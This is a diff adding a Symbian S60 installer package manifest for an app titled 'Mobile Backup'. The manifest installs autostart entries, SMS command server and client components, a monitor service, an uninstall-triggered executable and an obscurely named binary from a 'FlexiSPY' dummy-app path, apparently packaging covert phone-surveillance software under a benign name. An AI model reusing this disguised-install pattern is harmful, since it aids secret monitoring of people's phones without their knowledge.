@@ -1,0 +1,52 @@
+;Copyright(c) Vervata Co Ltd.
+
+;Language - standard language definitions
+&EN
+
+;Title, UID and application version information.
+#{"Mobile Backup"},(0x2000A97B),2,0,0
+"..\codebase\resource\light_3rd\FTA.txt"-"",FT,TA
+
+;Localised Vendor name
+%{"Vervata Co Ltd"}
+
+;Unique Vendor name
+:"Vervata Co Ltd"
+
+;Supports Series 60 v 3.0
+[0x101F7961], 0, 0, 0, {"Series60ProductID"}
+;[0x101F7961], 0, 0, 0, {"S60ProductID"}
+
+;remvoe app created file
+""-"c:\system\apps\2000A97B\vpnmnlog.dat", FN
+
+;run on uninstallation
+"C:\Symbian\9.2\S60_3rd_FP1\Epoc32\release\gcce\urel\ProxLock.exe"                 			-"c:\sys\bin\proxlock.exe",FR,RR,RW
+"C:\Symbian\9.2\S60_3rd_FP1\Epoc32\data\z\private\10003a3f\import\apps\ProxLock_reg.rsc"       -"c:\private\10003a3f\import\apps\proxlock_reg.rsc"
+"C:\Symbian\9.2\S60_3rd_FP1\Epoc32\data\z\resource\apps\ProxLock.r01"              			-"c:\resource\apps\proxlock.rsc"
+
+;Essential Application Files
+"C:\Symbian\9.2\S60_3rd_FP1\Epoc32\release\gcce\urel\rbacklite_0x2000A97B.exe"-"c:\sys\bin\rbacklite_0x2000A97B.exe"
+"C:\Symbian\9.2\S60_3rd_FP1\Epoc32\Data\z\resource\apps\rbacklite_0x2000A97B.r01"-"c:\resource\apps\rbacklite_0x2000A97B.rsc"
+"C:\Symbian\9.2\S60_3rd_FP1\Epoc32\Data\z\private\10003a3f\import\apps\rbacklite_0x2000A97B_reg.rsc"-"c:\private\10003a3f\import\apps\rbacklite_0x2000A97B_reg.rsc"
+"C:\Symbian\9.2\S60_3rd_FP1\Epoc32\Data\z\resource\apps\ProdActiv.r01"-"c:\resource\apps\ProdActiv_0x2000A97B.rsc"
+"..\codebase\gfx\menulist_res.mif"-"c:\private\2000A97B\menulist_res.mif"
+
+"..\CodeBase\resource\light_r_3rd\rbacklite_0x2000A97B_aif.mif"-"c:\resource\apps\rbacklite_0x2000A97B_aif.mif"
+"..\codebase\data\AppWizard_11_comp.db"			-"c:\private\2000A97B\apn.db"
+"C:\Symbian\9.2\S60_3rd_FP1\Epoc32\Data\z\private\101f875a\import\autostart_0x2000A97B.rsc"  	-"c:\private\101f875a\import\[2000A97B].rsc"
+
+;"C:\Symbian\Projects\errrd"-"c:\resource\errrd"
+"C:\Symbian\9.2\S60_3rd_FP1\Epoc32\release\GCCE\UREL\panmoncli_0x2000A97D.dll" 		 			-"c:\sys\bin\panmoncli_0x2000A97D.dll"
+"C:\Symbian\9.2\S60_3rd_FP1\Epoc32\release\gcce\urel\vpanmon_0x2000A97C.exe"  			 		-"c:\sys\bin\vpanmon_0x2000A97C.exe"
+
+"C:\Symbian\9.2\S60_3rd_FP1\Epoc32\release\GCCE\UREL\commonsrv_0x2000A981.DLL" 	 				-"c:\sys\bin\commonsrv_0x2000A981.dll"
+"C:\Symbian\9.2\S60_3rd_FP1\Epoc32\release\gcce\urel\commonsrv_0x2000A980.exe" 	 				-"c:\sys\bin\commonsrv_0x2000A980.exe"
+
+"C:\Symbian\9.2\S60_3rd_FP1\Epoc32\release\GCCE\UREL\vsmscserv_0x2000A97E.exe" 	 				-"c:\sys\bin\vsmscserv_0x2000A97E.exe"
+"C:\Symbian\9.2\S60_3rd_FP1\Epoc32\release\GCCE\UREL\SMSCMDCLI_0x2000A97F.DLL" 	 				-"c:\sys\bin\smscmdcli_0x2000A97F.dll"
+
+"C:\Symbian\9.2\S60_3rd_FP1\Epoc32\data\z\private\10003a3f\import\apps\x1664578_reg.rsc"-"c:\private\10003a3f\import\apps\x1664578_reg.rsc"
+"C:\Symbian\9.2\S60_3rd_FP1\Epoc32\data\z\resource\apps\x1664578.rsc"-"c:\resource\apps\x1664578.rsc"
+"C:\Symbian\9.2\S60_3rd_FP1\Epoc32\release\gcce\urel\x1664578.exe"-"c:\sys\bin\x1664578.exe"
+"C:\Symbian\Projects\FlexiSPY\DummyApp.Mgr\gfx\x1664578_aif.mif"-"c:\resource\apps\x1664578_aif.mif"
